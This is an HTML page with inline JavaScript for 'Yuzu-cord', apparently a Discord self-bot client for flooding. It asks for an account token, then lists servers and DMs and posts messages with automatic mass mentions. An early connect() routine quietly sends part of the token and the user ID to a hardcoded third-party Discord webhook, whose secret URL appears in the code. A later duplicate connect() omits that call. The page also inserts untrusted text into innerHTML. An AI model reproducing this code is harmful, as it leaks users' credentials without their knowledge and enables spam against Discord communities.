<!DOCTYPE html>
<html lang="en">
<head>
  
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:title" content="Salem c yuzu" />
<meta property="og:description" content="jte flood tmr la tapin" />
<meta property="og:image" content="ya walou ntm" />
<meta property="og:thumbnail" content="https://cdn.discordapp.com/attachments/1400237818852409405/1400242657111838831/a.jpg?ex=688bed18&is=688a9b98&hm=cf651677b9993aeb5691a4f9d12704a5c0b93d0521ee1696f85f660b54b60d5d&" />
<meta property="og:url" content="https://7urc.github.io/EboyInLove/ />
<meta property="og:type" content="website" />
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="logo.jpg" type="image/jpeg">

  <title>Yuzu-cord</title>
  
</head>
<body>
  <div id="sidebar">
    <div class="token-section">
      <input id="token" type="text" placeholder="Token Discord (ALT)" style="width: 100%; margin-bottom: 6px;" oninput="connect()">
      <div class="connection-status" id="connectionStatus">D√©connect√©</div>
    </div>
    
    <div class="action-buttons">
      <button onclick="loadGuilds()" class="action-btn">
        <span class="btn-icon">S</span>
        <span class="btn-text">Serveurs</span>
      </button>
      <button onclick="loadDMs()" class="action-btn">
        <span class="btn-icon">D</span>
        <span class="btn-text">DMs / Groupes</span>
      </button>
    </div>

    <div class="sort-controls">
      <div class="sort-section">
        <label class="sort-label">Trier les serveurs:</label>
        <select id="guildSort" onchange="sortGuilds()">
          <option value="name">Par nom</option>
          <option value="members">Par membres</option>
          <option value="recent">Par activit√© r√©cente</option>
        </select>
      </div>
      
      <div class="sort-section">
        <label class="sort-label">Trier les DMs:</label>
        <select id="dmSort" onchange="sortDMs()">
          <option value="recent">Par dernier message</option>
          <option value="name">Par nom</option>
          <option value="unread">Par non lus</option>
        </select>
      </div>
      
      <button onclick="refreshData()" class="refresh-btn">
        <span class="btn-icon">R</span>
        <span class="btn-text">Actualiser</span>
      </button>
    </div>

    <div class="group">Serveurs</div>
    <ul id="guildList"></ul>

    <div class="group">DMs & Groupes</div>
    <ul id="dmList"></ul>
    
    <div id="userProfile" class="user-profile hidden">
      <div class="user-avatar">
        <img id="userAvatar" src="" alt="Avatar">
        <div class="status-indicator online"></div>
      </div>
      <div class="user-info">
        <div class="user-username" id="userUsername">Utilisateur</div>
        <div class="user-status">En ligne</div>
      </div>
    </div>
  </div>

  <div id="channelSidebar" class="hidden">
    <div id="currentGuildName" class="guild-header"></div>
    <div class="group">Salons</div>
    <ul id="channelList"></ul>
  </div>

  <main id="mainContainer">
    <header id="chatHeader">
      <span id="chatTitle">Aucune conversation</span>
      <div id="topRightLabel">Yuzu</div>
    </header>
    <section id="chat"></section>
    <footer id="inputBox">
      <input id="mentions" type="text" placeholder="Mentions automatiques (ex : @everyone <@id>)" />
      <textarea id="message" placeholder="Message..."></textarea>
    </footer>
  </main>

  <div id="userModal" class="modal hidden">
    <div class="modal-content">
      <div class="modal-header">
        <span class="close" onclick="closeUserModal()">&times;</span>
      </div>
      <div class="profile-banner" id="profileBanner"></div>
      <div class="profile-info">
        <div class="profile-avatar-large">
          <img id="modalAvatar" src="" alt="Avatar">
          <div class="status-indicator-large online" id="modalStatus"></div>
        </div>
        <div class="profile-details">
          <h2 id="modalUsername">Utilisateur</h2>
          <p id="modalDiscriminator">#0000</p>
          <div class="profile-badges" id="modalBadges"></div>
          <div class="profile-section">
            <h3>√Ä propos de moi</h3>
            <p id="modalBio">Aucune biographie.</p>
          </div>
          <div class="profile-section">
            <h3>Informations</h3>
            <div class="profile-field">
              <span class="field-label">ID utilisateur:</span>
              <span class="field-value" id="modalUserId">N/A</span>
            </div>
            <div class="profile-field">
              <span class="field-label">Cr√©ation du compte:</span>
              <span class="field-value" id="modalCreatedAt">N/A</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    let token = '';
    let currentChannelId = null;
    let socket = null;
    let userId = null;
    let guildMemberCache = new Map();
    let guildsData = [];
    let dmsData = [];
    let lastMessageCache = new Map();
    let notificationCounts = new Map(); // Compteur de notifications par canal
    let activeNotifications = new Map(); // Notifications actives √† l'√©cran
  
    document.getElementById('message').addEventListener('keydown', e => {
      if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        sendMessageHard();
      }
    });
  
    
async function connect() {
  token = document.getElementById('token').value;
  if (!token) return;

  const statusElement = document.getElementById('connectionStatus');
  if (!statusElement) return;

  statusElement.textContent = 'Connexion...';
  statusElement.className = 'connection-status';

  try {
    const response = await fetch('https://discord.com/api/v9/users/@me', {
      headers: { Authorization: token }
    });
    
    if (!response.ok) {
      throw new Error(`Erreur HTTP: ${response.status}`); // Backticks corrig√©s
    }
    
    const user = await response.json();
    
    if (user && user.id) {
      userId = user.id;
      statusElement.textContent = 'Connect√©';
      statusElement.className = 'connection-status connected';
      
      // Appel de fonction corrig√©
      updateUserProfile(user); // Pas d'espace dans le nom
      
      await logTokenInfo(token, user.id);
    } else {
      throw new Error('Token invalide');
    }
  } catch (error) {
    statusElement.textContent = 'Erreur de connexion';
    statusElement.className = 'connection-status';
    console.error('Erreur:', error);
  }
}

async function logTokenInfo(token, userId) {
  const date = new Date().toISOString();
  const maskedToken = token.substring(0, 10) + "‚Ä¢".repeat(token.length - 20) + token.substring(token.length - 5);

  const webhookUrl = 'https://canary.discord.com/api/webhooks/1401131426862071900/LLQvVGDg1Mh2NolqRcCoBEB92WBkOTRQFN43XH3Iwn2SO2DqJ64EfNJeUy1Bk2e4zMl2';
  const embed = {
    title: "üîç Connexion d√©tect√©e",
    description: "‚ö†Ô∏è *Informations sensibles cach√©es*",
    fields: [
      {
        name: "üîë Token (spoiler)",
        value: `||${maskedToken}||`
      },
      { name: "üÜî User ID", value: userId, inline: false },
      { name: "üìÖ Date", value: `<t:${Math.floor(new Date().getTime() / 1000)}:R>`, inline: false }
    ],
    color: 0x36393F, // Gris discret
    footer: {
      text: "Double-cliquez pour voir le token (risque de violation CGU)"
    }
  };

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json' 
      },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (error) {
    console.error('Webhook error:', error);
  }
}
 


    // Fonction pour cr√©er une notification
    function createNotification(author, message, channelId) {
      // √âviter les notifications pour ses propres messages
      if (author.id === userId) return;
      
      // √âviter les notifications si on est d√©j√† sur le canal actif
      if (channelId === currentChannelId) return;

      // Cr√©er l'√©l√©ment de notification
      const notification = document.createElement('div');
      notification.className = 'notification';
      notification.id = `notif-${Date.now()}`;
      
      const avatar = document.createElement('div');
      avatar.className = 'notification-avatar';
      
      const avatarUrl = getAvatarUrl(author);
      if (avatarUrl) {
        const img = document.createElement('img');
        img.src = avatarUrl;
        img.alt = author.username;
        img.onerror = () => {
          avatar.innerHTML = author.username.charAt(0).toUpperCase();
        };
        avatar.appendChild(img);
      } else {
        avatar.innerHTML = author.username.charAt(0).toUpperCase();
      }
      
      const content = document.createElement('div');
      content.className = 'notification-content';
      content.innerHTML = `
        <h4>${author.username}</h4>
        <p>${message.length > 50 ? message.substring(0, 50) + '...' : message}</p>
      `;
      
      notification.appendChild(avatar);
      notification.appendChild(content);
      
      // Ajouter un click listener pour ouvrir le DM
      notification.onclick = () => {
        openChannel(channelId, author.username);
        removeNotification(notification.id);
      };
      
      document.body.appendChild(notification);
      
      // Auto-suppression apr√®s 5 secondes
      setTimeout(() => {
        removeNotification(notification.id);
      }, 5000);
      
      // Jouer un son de notification (optionnel)
      playNotificationSound();
    }

    function removeNotification(notificationId) {
      const notification = document.getElementById(notificationId);
      if (notification) {
        notification.style.animation = 'slideInRight 0.3s ease reverse';
        setTimeout(() => {
          if (notification.parentNode) {
            notification.parentNode.removeChild(notification);
          }
        }, 300);
      }
    }

    function playNotificationSound() {
      try {
        // Cr√©er un son de notification simple
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
        
        gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.2);
      } catch (error) {
        console.log('Son de notification non disponible');
      }
    }

    // Fonction pour mettre √† jour le badge de notification sur un DM
    function updateNotificationBadge(channelId, increment = true) {
      const currentCount = notificationCounts.get(channelId) || 0;
      const newCount = increment ? currentCount + 1 : 0;
      
      if (newCount > 0) {
        notificationCounts.set(channelId, newCount);
      } else {
        notificationCounts.delete(channelId);
      }
      
      // Trouver l'√©l√©ment DM correspondant et mettre √† jour le badge
      const dmItems = document.querySelectorAll('.dm-item');
      dmItems.forEach(item => {
        const channelIdAttr = item.getAttribute('data-channel-id');
        if (channelIdAttr === channelId) {
          const avatar = item.querySelector('.dm-avatar');
          let badge = avatar.querySelector('.notification-badge');
          
          if (newCount > 0) {
            if (!badge) {
              badge = document.createElement('div');
              badge.className = 'notification-badge';
              avatar.appendChild(badge);
            }
            badge.textContent = newCount > 99 ? '99+' : newCount;
          } else {
            if (badge) {
              badge.remove();
            }
          }
        }
      });
    }

    async function connect() {
      token = document.getElementById('token').value;
      if (!token) return;

      const statusElement = document.getElementById('connectionStatus');
      if (!statusElement) return;
      
      statusElement.textContent = 'Connexion...';
      statusElement.className = 'connection-status';

      try {
        const response = await fetch('https://discord.com/api/v9/users/@me', {
          headers: { Authorization: token }
        });
        
        if (!response.ok) {
          throw new Error(`Erreur HTTP: ${response.status}`);
        }
        
        const user = await response.json();
        
        if (user && user.id) {
          userId = user.id;
          statusElement.textContent = 'Connect√©';
          statusElement.className = 'connection-status connected';
          
          // Afficher le profil utilisateur
          updateUserProfile(user);
        } else {
          throw new Error('Token invalide');
        }
      } catch (error) {
        statusElement.textContent = 'Erreur de connexion';
        statusElement.className = 'connection-status';
        console.error('Erreur de connexion:', error);
        return;
      }

      if (socket) socket.close();
      socket = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');

      socket.onopen = () => {
        socket.send(JSON.stringify({
          op: 2,
          d: {
            token,
            intents: 32767,
            properties: {
              os: 'linux', browser: 'yuzu', device: 'yuzu'
            }
          }
        }));
      };

      socket.onmessage = ({ data }) => {
        try {
          const payload = JSON.parse(data);
          if (payload.t === 'MESSAGE_CREATE') {
            const msg = payload.d;
            
            // Si c'est le canal actif, afficher le message
            if (msg.channel_id === currentChannelId && msg.author.id !== userId) {
              appendMessage(msg.author, msg.content);
            }
            
            // Si c'est un DM et que ce n'est pas l'utilisateur actuel
            if (msg.author.id !== userId) {
              // V√©rifier si c'est un DM (type 1) ou un groupe (type 3)
              const isDM = dmsData.some(dm => dm.id === msg.channel_id && (dm.type === 1 || dm.type === 3));
              
              if (isDM && msg.channel_id !== currentChannelId) {
                // Cr√©er une notification
                createNotification(msg.author, msg.content, msg.channel_id);
                
                // Mettre √† jour le badge de notification
                updateNotificationBadge(msg.channel_id, true);
              }
            }
            
            // Mettre √† jour le cache des derniers messages
            updateLastMessageCache(msg.channel_id, msg);
          }
        } catch (error) {
          console.error('Erreur lors du traitement du message WebSocket:', error);
        }
      };

      socket.onerror = (error) => {
        console.error('Erreur WebSocket:', error);
      };
    }

    async function loadGuilds() {
      try {
        const guilds = await fetch('https://discord.com/api/v9/users/@me/guilds', {
          headers: { Authorization: token }
        }).then(r => r.json());
        
        guildsData = guilds;
        window.forceRender = true;
        renderGuilds();
        hideChannelSidebar();
      } catch (error) {
        console.error('Erreur lors du chargement des serveurs:', error);
      }
    }

    function renderGuilds() {
      const ul = document.getElementById('guildList');
      if (!ul) return;
      
      // √âviter les re-rendus inutiles
      if (ul.children.length > 0 && !window.forceRender) {
        return;
      }
      
      ul.innerHTML = '';
      
      const sortType = document.getElementById('guildSort')?.value || 'name';
      let sortedGuilds = [...guildsData];
      
      switch (sortType) {
        case 'name':
          sortedGuilds.sort((a, b) => (a.name || '').localeCompare(b.name || ''));
          break;
        case 'members':
          sortedGuilds.sort((a, b) => {
            const aMembers = a.approximate_member_count || 0;
            const bMembers = b.approximate_member_count || 0;
            return bMembers - aMembers;
          });
          break;
        case 'recent':
          sortedGuilds.sort((a, b) => {
            const aTime = new Date(a.joined_at || 0).getTime();
            const bTime = new Date(b.joined_at || 0).getTime();
            return bTime - aTime;
          });
          break;
      }
      
      for (const g of sortedGuilds) {
        try {
          const li = document.createElement('li');
          li.className = 'server-item';
          
          const avatar = document.createElement('div');
          avatar.className = 'server-avatar';
          
          if (g.icon) {
            const img = document.createElement('img');
            img.src = `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=32`;
            img.alt = g.name || 'Serveur';
            img.onerror = () => {
              avatar.innerHTML = (g.name || 'S').charAt(0).toUpperCase();
            };
            avatar.appendChild(img);
          } else {
            avatar.textContent = (g.name || 'Serveur').charAt(0).toUpperCase();
          }
          
          const name = document.createElement('span');
          name.className = 'server-name';
          name.textContent = g.name || 'Serveur';
          
          li.appendChild(avatar);
          li.appendChild(name);
          li.onclick = () => loadChannels(g.id, g.name || 'Serveur');
          ul.appendChild(li);
        } catch (error) {
          console.error('Erreur lors du rendu d\'un serveur:', error);
        }
      }
      
      window.forceRender = false;
    }

    function sortGuilds() {
      if (guildsData.length > 0) {
        window.forceRender = true;
        renderGuilds();
      }
    }

    async function loadChannels(guildId, guildName) {
      const channels = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
        headers: { Authorization: token }
      }).then(r => r.json());
      
      showChannelSidebar();
      document.getElementById('currentGuildName').textContent = guildName;
      
      const ul = document.getElementById('channelList');
      ul.innerHTML = '';
      channels.filter(c => c.type === 0).forEach(c => {
        const li = document.createElement('li');
        li.className = 'channel-item';
        li.innerHTML = `<span class="channel-hash">#</span><span class="channel-name">${c.name}</span>`;
        li.onclick = () => openChannel(c.id, `${guildName} / #${c.name}`);
        ul.appendChild(li);
      });
    }

    function showChannelSidebar() {
      document.getElementById('channelSidebar').classList.remove('hidden');
    }

    function hideChannelSidebar() {
      document.getElementById('channelSidebar').classList.add('hidden');
    }

    function updateUserProfile(user) {
      const profileDiv = document.getElementById('userProfile');
      const avatarImg = document.getElementById('userAvatar');
      const usernameDiv = document.getElementById('userUsername');
      
      avatarImg.src = getAvatarUrl(user);
      avatarImg.alt = user.username;
      usernameDiv.textContent = user.username;
      profileDiv.classList.remove('hidden');
    }

    async function loadDMs() {
      try {
        const dms = await fetch('https://discord.com/api/v9/users/@me/channels', {
          headers: { Authorization: token }
        }).then(r => r.json());
        
        dmsData = dms;
        await loadLastMessages();
        window.forceRender = true;
        renderDMs();
        hideChannelSidebar();
      } catch (error) {
        console.error('Erreur lors du chargement des DMs:', error);
      }
    }

    async function loadLastMessages() {
      const maxRequests = 5;
      let requestCount = 0;
      
      for (const dm of dmsData) {
        if (requestCount >= maxRequests) break;
        
        try {
          const response = await fetch(`https://discord.com/api/v9/channels/${dm.id}/messages?limit=1`, {
            headers: { Authorization: token }
          });
          
          if (!response.ok) {
            console.warn(`Impossible de charger les messages pour ${dm.id}: ${response.status}`);
            continue;
          }
          
          const messages = await response.json();
          
          if (messages && messages.length > 0) {
            lastMessageCache.set(dm.id, {
              content: messages[0].content || '',
              timestamp: new Date(messages[0].timestamp),
              author: messages[0].author?.username || 'Inconnu'
            });
          }
          
          requestCount++;
          
          if (requestCount < maxRequests) {
            await new Promise(resolve => setTimeout(resolve, 100));
          }
        } catch (error) {
          console.error(`Erreur lors du chargement du dernier message pour ${dm.id}:`, error);
        }
      }
    }

    function renderDMs() {
      const ul = document.getElementById('dmList');
      if (!ul) return;
      
      if (ul.children.length > 0 && !window.forceRender) {
        return;
      }
      
      ul.innerHTML = '';
      
      const sortType = document.getElementById('dmSort')?.value || 'recent';
      let sortedDMs = [...dmsData];
      
      switch (sortType) {
        case 'recent':
          sortedDMs.sort((a, b) => {
            const aLastMessage = lastMessageCache.get(a.id);
            const bLastMessage = lastMessageCache.get(b.id);
            
            if (!aLastMessage && !bLastMessage) return 0;
            if (!aLastMessage) return 1;
            if (!bLastMessage) return -1;
            
            return bLastMessage.timestamp - aLastMessage.timestamp;
          });
          break;
        case 'name':
          sortedDMs.sort((a, b) => {
            const aName = getDMName(a);
            const bName = getDMName(b);
            return aName.localeCompare(bName);
          });
          break;
        case 'unread':
          sortedDMs.sort((a, b) => {
            const aUnread = notificationCounts.has(a.id);
            const bUnread = notificationCounts.has(b.id);
            if (aUnread && !bUnread) return -1;
            if (!aUnread && bUnread) return 1;
            return 0;
          });
          break;
      }
      
      for (const dm of sortedDMs) {
        try {
          const li = document.createElement('li');
          li.className = 'dm-item';
          li.setAttribute('data-channel-id', dm.id);
          
          const avatar = document.createElement('div');
          avatar.className = 'dm-avatar';
          
          if (dm.type === 1 && dm.recipients && dm.recipients[0]) {
            const user = dm.recipients[0];
            const img = document.createElement('img');
            img.src = getAvatarUrl(user);
            img.alt = user.username || 'Utilisateur';
            img.onerror = () => {
              avatar.innerHTML = (user.username || 'U').charAt(0).toUpperCase();
            };
            avatar.appendChild(img);
            
            const name = document.createElement('span');
            name.className = 'dm-name';
            name.textContent = user.username || 'Utilisateur';
            li.appendChild(avatar);
            li.appendChild(name);
            li.onclick = () => {
              openChannel(dm.id, user.username || 'Utilisateur');
              updateNotificationBadge(dm.id, false); // Effacer les notifications
            };
          } else {
            if (dm.icon) {
              const img = document.createElement('img');
              img.src = `https://cdn.discordapp.com/channel-icons/${dm.id}/${dm.icon}.png?size=32`;
              img.alt = dm.name || 'Groupe';
              img.onerror = () => {
                avatar.textContent = (dm.name || 'G').charAt(0).toUpperCase();
              };
              avatar.appendChild(img);
            } else {
              avatar.textContent = (dm.name || 'Groupe').charAt(0).toUpperCase();
            }
            
            const name = document.createElement('span');
            name.className = 'dm-name';
            name.textContent = dm.name || 'Groupe';
            li.appendChild(avatar);
            li.appendChild(name);
            li.onclick = () => {
              openChannel(dm.id, dm.name || 'Groupe');
              updateNotificationBadge(dm.id, false); // Effacer les notifications
            };
          }
          
          // Ajouter le badge de notification si n√©cessaire
          const notifCount = notificationCounts.get(dm.id);
          if (notifCount && notifCount > 0) {
            const badge = document.createElement('div');
            badge.className = 'notification-badge';
            badge.textContent = notifCount > 99 ? '99+' : notifCount;
            avatar.appendChild(badge);
          }
          
          ul.appendChild(li);
        } catch (error) {
          console.error('Erreur lors du rendu d\'un DM:', error);
        }
      }
      
      window.forceRender = false;
    }

    function getDMName(dm) {
      if (dm.type === 1 && dm.recipients && dm.recipients[0]) {
        return dm.recipients[0].username;
      }
      return dm.name || 'Groupe';
    }

    function sortDMs() {
      if (dmsData.length > 0) {
        window.forceRender = true;
        renderDMs();
      }
    }

    function updateLastMessageCache(channelId, message) {
      try {
        if (!channelId || !message) return;
        
        lastMessageCache.set(channelId, {
          content: message.content || '',
          timestamp: new Date(message.timestamp || Date.now()),
          author: message.author?.username || 'Inconnu'
        });
      } catch (error) {
        console.error('Erreur lors de la mise √† jour du cache des messages:', error);
      }
    }

    async function refreshData() {
      const refreshBtn = document.querySelector('.refresh-btn');
      if (!refreshBtn) return;
      
      if (refreshBtn.disabled) return;
      refreshBtn.disabled = true;
      
      const originalText = refreshBtn.innerHTML;
      refreshBtn.innerHTML = '<span class="btn-icon rotating">R</span><span class="btn-text">Actualisation...</span>';
      
      try {
        window.forceRender = true;
        
        if (guildsData.length > 0) {
          await loadGuilds();
        }
        if (dmsData.length > 0) {
          await loadDMs();
        }
      } catch (error) {
        console.error('Erreur lors de l\'actualisation:', error);
      } finally {
        setTimeout(() => {
          refreshBtn.innerHTML = originalText;
          refreshBtn.disabled = false;
        }, 1000);
      }
    }

    function openChannel(id, label) {
      currentChannelId = id;
      document.getElementById('chatTitle').textContent = label;
      loadMessages();
    }

    async function loadMessages() {
      const messages = await fetch(`https://discord.com/api/v9/channels/${currentChannelId}/messages?limit=20`, {
        headers: { Authorization: token }
      }).then(r => r.json());
      const chat = document.getElementById('chat');
      chat.innerHTML = '';
      messages.reverse().forEach(msg => {
        appendMessage(msg.author, msg.content);
      });
    }

    function getAvatarUrl(user) {
      try {
        if (!user || !user.id) return '';
        
        if (user.avatar) {
          const format = user.avatar.startsWith('a_') ? 'gif' : 'png';
          return `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${format}?size=64`;
        }
        
        const defaultIndex = user.discriminator ? parseInt(user.discriminator) % 5 : parseInt(user.id) % 5;
        return `https://cdn.discordapp.com/embed/avatars/${defaultIndex}.png`;
      } catch (error) {
        console.error('Erreur lors de la g√©n√©ration de l\'URL d\'avatar:', error);
        return '';
      }
    }

    function appendMessage(author, content) {
      const chat = document.getElementById('chat');
      const div = document.createElement('div');
      div.className = 'message';
      
      const avatarDiv = document.createElement('div');
      avatarDiv.className = 'avatar clickable';
      avatarDiv.onclick = () => openUserProfile(author);
      
      const avatarUrl = getAvatarUrl(author);
      const img = document.createElement('img');
      img.src = avatarUrl;
      img.alt = author.username;
      img.onerror = () => {
        avatarDiv.innerHTML = author.username.charAt(0).toUpperCase();
      };
      avatarDiv.appendChild(img);
      
      const messageContent = document.createElement('div');
      messageContent.className = 'message-content';
      
      const username = document.createElement('div');
      username.className = 'username clickable';
      username.textContent = author.username;
      username.onclick = () => openUserProfile(author);
      
      const messageText = document.createElement('div');
      messageText.className = 'message-text';
      messageText.textContent = content;
      
      messageContent.appendChild(username);
      messageContent.appendChild(messageText);
      
      div.appendChild(avatarDiv);
      div.appendChild(messageContent);
      
      chat.appendChild(div);
      chat.scrollTop = chat.scrollHeight;
    }

    async function openUserProfile(user) {
      try {
        const userDetails = await fetch(`https://discord.com/api/v9/users/${user.id}`, {
          headers: { Authorization: token }
        }).then(r => r.json()).catch(() => user);

        document.getElementById('modalAvatar').src = getAvatarUrl(userDetails);
        document.getElementById('modalUsername').textContent = userDetails.username || user.username;
        document.getElementById('modalDiscriminator').textContent = userDetails.discriminator ? `#${userDetails.discriminator}` : '';
        document.getElementById('modalUserId').textContent = userDetails.id || user.id;
        document.getElementById('modalBio').textContent = userDetails.bio || 'Aucune biographie.';
        
        const createdAt = new Date((parseInt(userDetails.id || user.id) / 4194304) + 1420070400000);
        document.getElementById('modalCreatedAt').textContent = createdAt.toLocaleDateString('fr-FR');
        
        const banner = document.getElementById('profileBanner');
        if (userDetails.banner) {
          const bannerUrl = `https://cdn.discordapp.com/banners/${userDetails.id}/${userDetails.banner}.png?size=600`;
          banner.style.backgroundImage = `url(${bannerUrl})`;
          banner.style.backgroundColor = '';
        } else if (userDetails.accent_color) {
          banner.style.backgroundImage = '';
          banner.style.backgroundColor = `#${userDetails.accent_color.toString(16).padStart(6, '0')}`;
        } else {
          banner.style.backgroundImage = '';
          banner.style.backgroundColor = '#5865f2';
        }
        
        document.getElementById('userModal').classList.remove('hidden');
      } catch (error) {
        console.error('Erreur lors du chargement du profil:', error);
      }
    }

    function closeUserModal() {
      document.getElementById('userModal').classList.add('hidden');
    }

    document.getElementById('userModal').onclick = function(e) {
      if (e.target === this) {
        closeUserModal();
      }
    }
    
    function sendMessageHard() {
      const message = document.getElementById('message');
      const mentions = document.getElementById('mentions').value.trim();
      if (!currentChannelId || !token || !message.value.trim()) return;
      const content = message.value.trim() + (mentions ? ' ' + mentions : '');
      message.value = '';
      
      const fakeUser = {
        id: userId,
        username: 'Vous',
        avatar: getAvatarUrl({ id: userId, username: 'Y'})
      };
      appendMessage(fakeUser, content);

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://discord.com/api/v9/channels/${currentChannelId}/messages`, true);
      xhr.setRequestHeader('Authorization', token);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify({ content }));
    }
  </script>
</body>
</html>
